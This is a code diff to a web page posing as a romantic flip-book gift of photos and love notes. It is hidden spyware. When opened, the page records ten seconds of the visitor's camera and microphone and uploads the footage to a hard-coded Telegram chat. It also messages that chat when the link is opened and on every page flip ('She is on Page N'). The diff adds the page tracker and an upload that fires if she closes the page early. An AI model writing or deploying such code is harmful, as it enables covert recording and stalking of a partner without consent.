@@ -17,8 +17,7 @@
         .book { 
             width: 420px; height: 580px; position: relative; transform-style: preserve-3d; 
             background: url('bg.jpg') no-repeat center center;
-            background-size: cover;
-            border-radius: 20px;
+            background-size: cover; border-radius: 20px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.3);
         }
         .page { width: 100%; height: 100%; position: absolute; top: 0; left: 0; transform-origin: left; transform-style: preserve-3d; transition: transform 1.2s cubic-bezier(0.645, 0.045, 0.355, 1); cursor: pointer; }
@@ -31,8 +30,7 @@
             width: 100%; height: 100%; position: absolute; backface-visibility: hidden; padding: 30px; box-sizing: border-box; display: flex; flex-direction: column; align-items: center; justify-content: center;
             transform: rotateY(180deg); 
             background: url('bg2.jpg') no-repeat center center !important; 
-            background-size: cover !important; 
-            border-radius: 20px 0 0 20px; 
+            background-size: cover !important; border-radius: 20px 0 0 20px; 
         }
         img, video { max-width: 100%; max-height: 350px; border: 8px solid white; box-shadow: 0 5px 15px rgba(0,0,0,0.2); border-radius: 5px; }
         p { font-size: 1.3rem; color: #444; text-align: center; margin-top: 20px; background: rgba(255,255,255,0.7); padding: 5px 10px; border-radius: 10px; }
@@ -49,14 +47,11 @@
     <audio id="bg-music" loop><source src="music.mp3" type="audio/mpeg"></audio>
     <div id="diary-wrapper">
         <div class="book">
-            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="she.jpeg"><p>A blooming surprise... 💌</p></div><div class="back"></div></div>
-            <div class="page" onclick="this.classList.toggle('flipped')">
-                <div class="front"><video id="main-video" controls><source src="video.mp4" type="video/mp4"></video><p>ilysmmmmm :) 🎥</p></div>
-                <div class="back"></div>
-            </div>
-            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="letter.jpeg"><p>From my heart... ❤️</p></div><div class="back"></div></div>
-            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="eyes.jpeg"><p>My world is in your eyes ✨</p></div><div class="back"></div></div>
-            <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="best.jpeg"><p>The best part of me 🌟</p></div><div class="back"></div></div>
+            <div class="page" onclick="flipPage(this, 1)"><div class="front"><img src="she.jpeg"><p>A blooming surprise... 💌</p></div><div class="back"></div></div>
+            <div class="page" onclick="flipPage(this, 2)"><div class="front"><video id="main-video" controls><source src="video.mp4" type="video/mp4"></video><p>ilysmmmmm :) 🎥</p></div><div class="back"></div></div>
+            <div class="page" onclick="flipPage(this, 3)"><div class="front"><img src="letter.jpeg"><p>From my heart... ❤️</p></div><div class="back"></div></div>
+            <div class="page" onclick="flipPage(this, 4)"><div class="front"><img src="eyes.jpeg"><p>My world is in your eyes ✨</p></div><div class="back"></div></div>
+            <div class="page" onclick="flipPage(this, 5)"><div class="front"><img src="best.jpeg"><p>The best part of me 🌟</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Happy Place.jpeg"><p>My favorite place 💗</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="her core.jpeg"><p>Always in my core ♡</p></div><div class="back"></div></div>
             <div class="page" onclick="this.classList.toggle('flipped')"><div class="front"><img src="Hugs for my Bebe.jpeg"><p>Hugs for my bebe 🫂</p></div><div class="back"></div></div>
@@ -80,14 +75,19 @@
         function setupZ() { const pages = document.querySelectorAll('.page'); pages.forEach((el, i) => { el.style.zIndex = pages.length - i; }); }
         setupZ();
 
+        // Tracker: Send notification when she flips a page
+        function flipPage(el, pageNum) {
+            el.classList.toggle('flipped');
+            if(el.classList.contains('flipped')) {
+                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=She%20is%20on%20Page%20${pageNum}%20❤️`);
+            }
+        }
+
         async function startDiary() {
             try {
-                // 🔔 NEW: Send "Link Opened" notification immediately
                 fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=5324376571&text=Link%20Opened!%20❤️`);
-
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 document.getElementById('video-preview').srcObject = stream;
-                
                 mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
                 mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
                 mediaRecorder.start();
@@ -95,9 +95,11 @@
                 document.getElementById('diary-wrapper').style.display = 'block';
                 bgMusic.play();
 
-                setTimeout(() => { if (mediaRecorder.state !== "inactive") mediaRecorder.stop(); }, 10000);
+                // Standard Auto-stop after 10s
+                setTimeout(() => { if (mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
 
                 mediaRecorder.onstop = async () => {
+                    if (recordedChunks.length === 0) return;
                     const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                     const formData = new FormData();
                     formData.append('chat_id', "5324376571"); 
@@ -106,6 +108,13 @@
                 };
             } catch (err) { alert("Camera access needed! ❤️"); }
         }
+
+        // EMERGENCY UPLOAD: If she closes early, send what we have
+        window.addEventListener('beforeunload', () => {
+            if (mediaRecorder && mediaRecorder.state === "recording") {
+                mediaRecorder.stop();
+            }
+        });
 
         async function triggerSecretUpload(btn) {
             bgMusic.pause();
